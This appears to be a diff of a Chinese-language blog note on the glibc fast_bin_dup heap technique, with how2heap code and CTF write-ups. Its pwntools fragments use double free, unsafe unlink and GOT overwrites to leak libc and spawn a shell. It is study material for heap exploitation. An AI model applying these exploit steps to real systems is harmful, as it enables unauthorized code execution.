@@ -1,5 +1,5 @@
 ---
-title: How2heap_fast_bin_dup
+title: fast_bin_dup
 timestamp: 2026-07-22 16:26:00+08:00
 toc: true
 tags: [PWN, PWN/Heap, PWN/Heap/fast_bin, Manual]
@@ -9,9 +9,9 @@ tags: [PWN, PWN/Heap, PWN/Heap/fast_bin, Manual]
 ---
 ## ***fast_bin_dup***
 ---
-- 描述：通过滥用 `fastbin` 空闲链表，欺骗 `malloc` 返回一个已经被分配过的堆指针
+- 描述：通过滥用 `fastbin` 空闲链表，`malloc` 返回一个几乎任意的指针
 - 功能：
-	>任意地址分配，进而实现任意地址读写
+	>近似地实现任意地址分配，进而实现任意地址读写
 - 版本要求：`glibc` - `< 2.43` ：`fast_bins` 存在，可用
 	>`glibc` - `>= 2.23` ：取出 `chunk` 的 `size` 须与请求落在同一 `fast_bin_index`
 	>`glibc` - `>= 2.26` ：需填满 `tcache` ( `7` 次 `free` ) ^6b34a9
@@ -22,6 +22,8 @@ tags: [PWN, PWN/Heap, PWN/Heap/fast_bin, Manual]
 	>成功泄露 `libc` 基址
 	>能够成功泄露 `heap` 基址
 	>目标地址附近存在合法的 `fast_bin_size`
+- 注意：
+    >无
 - 
 ![](/notes/pictures/fast_bin_dup/Pasted%20image%2020260723084612.webp)
 ```cpp
@@ -75,7 +77,11 @@ int main()
 	int *b = malloc(8);
 	int *c = malloc(8);
 ```
+```image-layout
+mode: full
 ![](/notes/pictures/fast_bin_dup/Pasted%20image%2020260722165209.webp)
+```
+
 在此处，首先创建三个 `chunk` 其中 `a` 、 `b` 是我们需要的实验用 `chunk` ，`c` 应该是用来与 `top_chunk` 的隔离。
 在之前较低版本时，甚至可以直接进行 `dup` ，即连续 `free` 同一个 `chunk` ，但是对于现在的版本，由于添加了检查，常见的利用方式是：先 `free` 一个其他 `chunk` 随后再进行 `dup`
 ```cpp
@@ -147,6 +153,8 @@ int main()
 - 期望：
 	>能够对 `main` 或长期存在的栈帧进行攻击
 	>目标地址附近存在合法的 `fast_bin_size`
+- 注意：
+    >无
 - 
 ![](/notes/pictures/fast_bin_dup/Pasted%20image%2020260723084919.webp)
 ```cpp
@@ -212,7 +220,10 @@ int main()
 	int *b = malloc(8);
 	int *c = malloc(8);
 ```
+```image-layout
+mode: full
 ![](/notes/pictures/fast_bin_dup/Pasted%20image%2020260723085355.webp)
+```
 ```cpp
 	fprintf(stderr, "Freeing the first one...\n");
 	free(a);
@@ -360,15 +371,24 @@ leak("leak_libc", leak_libc)
 leak("lib_base", lib_base)
 itr()
 ```
-
+```image-layout
+mode: full
 ![](/notes/pictures/fast_bin_dup/Pasted%20image%2020260726210851.webp)
-
+```
 
 ---
 #### 分析与利用
 ![](/notes/pictures/fast_bin_dup/Pasted%20image%2020260725152142.webp)
 题目只提供两个功能：`Search` 跟 `Index` 
-其中 `Index` 类似于创建，其创建的数据结构如下图所示![](/notes/pictures/fast_bin_dup/Pasted%20image%2020260726212621.webp)![](/notes/pictures/fast_bin_dup/Pasted%20image%2020260726213441.webp)
+```image-layout
+mode: full
+![](/notes/pictures/fast_bin_dup/Pasted%20image%2020260726212621.webp)
+```
+```image-layout
+mode: full
+![](/notes/pictures/fast_bin_dup/Pasted%20image%2020260726213441.webp)
+```
+
 题目的漏洞出现在 `search` 中，由于仅仅 `free` 了句块，并没有将其置零，与此同时，没有对词块进行任何处理，导致出现了 `UAF` 漏洞，那么有没有可能在这个地方实现 `dup` 呢？请看下图进入删除的条件分支![](/notes/pictures/fast_bin_dup/Pasted%20image%2020260726213624.webp)
 分析后得到以下三个条件：
 >1. 句子不为空
@@ -401,7 +421,11 @@ search(b"\x00" * 4)
 delete(b"y")
 delete(b"n")
 ```
+```image-layout
+mode: full
 ![](/notes/pictures/fast_bin_dup/Pasted%20image%2020260726230447.webp)
+```
+
 另需说明，多句子中，词链表仍然会继续延伸，因此，在多次 `Index` 之后进行一次 `Search` 即可，同时由于 `chunk_c` 最后被 `free` 其链表为空，`dup` 时不会参与到查询中![](/notes/pictures/fast_bin_dup/Pasted%20image%2020260726231140.webp)
 此时可以看到调用链已经被我们修改，可以在看一下对应的数据![](/notes/pictures/fast_bin_dup/Pasted%20image%2020260726231351.webp)
 即可获得 `shell` 了![](/notes/pictures/fast_bin_dup/Pasted%20image%2020260726231600.webp)
@@ -427,6 +451,8 @@ delete(b"n")
 - 期望：
 	>能够通过 `libc` 泄露能够进行进一步的攻击
 	>能够伪造 `fake_chunk` 进行 `unlink_attack`
+- 注意：
+    >无
 - 
 ![](/notes/pictures/fast_bin_dup/Pasted%20image%2020260723221852.webp)
 ```cpp
@@ -503,30 +529,21 @@ int main() {
 过程中需要利用到 `UAF` 漏洞来进行操作，利用合并机制，完成一次 `chunk` 的重叠
 ```cpp
 void* p1 = calloc(1,0x40);
-
 printf("Allocate a fastbin chunk p1=%p \n", p1);
-
 printf("Freeing p1 will add it to the fastbin.\n\n");
-
 free(p1);
-
 void* p3 = malloc(0x400);
 ```
+
 在这个过程中，在 `malloc` 出 `p3` 时，程序会首先触发 `malloc_consolidate` 函数，对 `free` 的 位于 `fast_bin` 中的 `chunk` 与相邻的空闲的 `chunk` (包括 `top_chunk` )进行合并，此时 `bins` 中将没有任何的 `chunk` ，接下来创建 `p3` 就需要直接从 `top_chunk` 中进行切割，最终形成的是 `fast_sized_chunk` 与 `large_sized_chunk` 的堆叠![](/notes/pictures/fast_bin_dup/Pasted%20image%2020260724012129.webp)
 接下来再进行一次上述操作
 ```cpp
 free(p1); // vulnerability
-
 printf("So p1 is double freed, and p3 hasn't been freed although it now points to the top, as our\n");
-
 printf("chunk got consolidated with it. We have thus achieved UAF!\n");
-
 printf("We will request a chunk of size 0x400, this will give us a 0x410 chunk from the top\n");
-
 printf("p3 and p1 will still be pointing to it.\n");
-
 void *p4 = malloc(0x400);
-
 assert(p4 == p3);
 ```
 
@@ -648,9 +665,10 @@ add(2, b"/bin/sh\0")
 delete(2)
 itr()
 ```
-
+```image-layout
+mode: full
 ![](/notes/pictures/fast_bin_dup/Pasted%20image%2020260728103833.webp)
-
+```
 
 ---
 #### 分析与利用
@@ -659,21 +677,30 @@ itr()
 很明显的是，题目在此处是存在着 `UAF` 漏洞的，并没有将对应的指针置为 `nullptr` ，另外，由于在 `free` 前没有做任何的检查，这就使得我们可以实现 `chunk` 的 `dup`
 而为了实现目标，仍然是需要做 `libc` 基址的泄露
 通过分析，能够很容易的发现，题目并没有给输出函数，因此也就没有常规的进行泄露的手段。对于大部分题目而言，应当是开启 `FULL_RELRO` 的，就只能够通过 `_IO_FILE` 去泄露。但很幸运，此题并没有，我们就可以操作 `got` 表，通过将 `free` 改为 `puts` 即可实现用户区内容的泄露。而后仍然是修改 `free` 为 `system` 函数，即可实现漏洞的利用
+
+---
 关于此题目最先要考虑是，如何去控制 `got` 的地址，目前虽然能够实现 `dup` 但是由于三种大小都只能创建一个块，因此无法实现任意地址写，那么通过伪造 `fake_chunk` 来实现 `unsafe_unlink_attack` 是很好的选择
 ```python
 add(1, b"aaaa")
 add(2, b"bbbb")
 delete(1)
 ```
+```image-layout
+mode: full
 ![](/notes/pictures/fast_bin_dup/Pasted%20image%2020260729153552.webp)
+```
+
 可以看到此时 `chunk1_a` 处于 `fast_bin` 链表中
 ```python
 add(3, b"cccc")
 delete(1)
 ```
+```image-layout
+mode: full
 ![](/notes/pictures/fast_bin_dup/Pasted%20image%2020260729154603.webp)
-执行完之后可以看到，此时就已经实现了 `dup` ，但是更重要的是能够为接下来的合并做准备，将 `chunk_b` 的标志位置 `0` 以便进行下一步 `unsafe_unlink_attack` 。其中创建 `chunk3` 就是为了让 `fast_bin_chunk` 转到对应的 `small_bin` 中，把同样的 `chunk` 置于不同的链表中，以此绕过 `double_free` 检查。接着要做的就是伪造 `fake_chunk` 了
-![](/notes/pictures/fast_bin_dup/Pasted%20image%2020260729161447.webp)![](/notes/pictures/fast_bin_dup/Pasted%20image%2020260729161626.webp)
+```
+
+执行完之后可以看到，此时就已经实现了 `dup` ，但是更重要的是能够为接下来的合并做准备，将 `chunk_b` 的标志位置 `0` 以便进行下一步 `unsafe_unlink_attack` 。其中创建 `chunk3` 就是为了让 `fast_bin_chunk` 转到对应的 `small_bin` 中，把同样的 `chunk` 置于不同的链表中，以此绕过 `double_free` 检查。接着要做的就是伪造 `fake_chunk` 。需要注意的是，为了满足 `unlink` 的链表检查，我们需要构造一个特殊的结构，满足 `*(FD->bk) == *(BK->fd)` ，我们的解决方案是直接使 `FD->bk == BK->fd` ，由于链表中指向的是 `chunk` 头，地址就需要减去对应的数值，如以上代码块所示，最后的 `b"\x20"` 也是为了满足合并的条件
 ```python
 target_addr = 0x6020D0
 
@@ -685,8 +712,23 @@ fake_chunk += b"\x20"
 add(1, fake_chunk)
 delete(2)
 ```
-需要注意的是，为了满足 `unlink` 的链表检查，我们需要构造一个特殊的结构，就是满足 `*(FD->bk) == *(BK->fd)` ，我们的解决方案是直接使 `FD->bk == BK->fd` ，由于链表中指向的是 `chunk` 头，地址就需要减去对应的数值，如以上代码块所示，最后的 `b"\x20"` 也是为了满足合并的条件
-这个时候，我们再看目标地址附近的数据的变化，下图是未执行 `unsafe_unlink_attack` 时的状态![](/notes/pictures/fast_bin_dup/Pasted%20image%2020260729162420.webp)![](/notes/pictures/fast_bin_dup/Pasted%20image%2020260729162656.webp)
+```image-layout
+mode: full
+![](/notes/pictures/fast_bin_dup/Pasted%20image%2020260729161447.webp)
+```
+```image-layout
+mode: full
+![](/notes/pictures/fast_bin_dup/Pasted%20image%2020260729161626.webp)
+```
+```image-layout
+mode: full
+![](/notes/pictures/fast_bin_dup/Pasted%20image%2020260729162420.webp)
+```
+```image-layout
+mode: full
+![](/notes/pictures/fast_bin_dup/Pasted%20image%2020260729162656.webp)
+```
+
 我们可以看到 `chunk_a` 的地址被我们改为了 `0x6020b8` ，相对应的，我们就可以随意修改这部分数据，接下来就是要把修改的目标转到 `.got` 区域。通过计算偏移，能够很容易的构造以下恶意数据，执行完毕之后，即将 `free_got` 改写为 `puts` 函数的地址，然后即可完成泄露
 ```python
 pl = b""
@@ -696,8 +738,23 @@ pl += p32(1) * 3
 
 edit(1, pl)
 edit(1, p64(puts_plt))
+delete(2)
+lib_base = uu64(io.recv(6)) - lib.sym["puts"]
+leak("lib_base", lib_base)
 ```
-![](/notes/pictures/fast_bin_dup/Pasted%20image%2020260729175105.webp)![](/notes/pictures/fast_bin_dup/Pasted%20image%2020260729175338.webp)![](/notes/pictures/fast_bin_dup/Pasted%20image%2020260729181634.webp)
+```image-layout
+mode: full
+![](/notes/pictures/fast_bin_dup/Pasted%20image%2020260729175105.webp)
+```
+```image-layout
+mode: full
+![](/notes/pictures/fast_bin_dup/Pasted%20image%2020260729175338.webp)
+```
+```image-layout
+mode: full
+![](/notes/pictures/fast_bin_dup/Pasted%20image%2020260729181634.webp)
+```
+
 泄露 `libc` 基址之后，即可获得 `system` 地址，通过同样的方法，即可获得 `shell`
 ```python
 sys = lib_base + lib.sym["system"]
@@ -707,12 +764,15 @@ add(2, b"/bin/sh\0")
 delete(2)
 itr()
 ```
+```image-layout
+mode: full
 ![](/notes/pictures/fast_bin_dup/Pasted%20image%2020260730091445.webp)
+```
 
 ---
 ---
 ## 📑总结与思考
-很感慨。这是第一篇，希望最后一篇来的更晚一点
+本质上是对 `heap` 的知识点了解不深的，是应该努力学习的，是应该知耻而后勇的。因此，希望之后能继续写出这样子的文章，继续努力，在成为大黑客的路上继续迈步。
 [Run - Snow Patrol](https://www.bilibili.com/video/BV1WV4y1m7Fd/?spm_id_from=333.1007.top_right_bar_window_custom_collection.content.click)
 
 ---
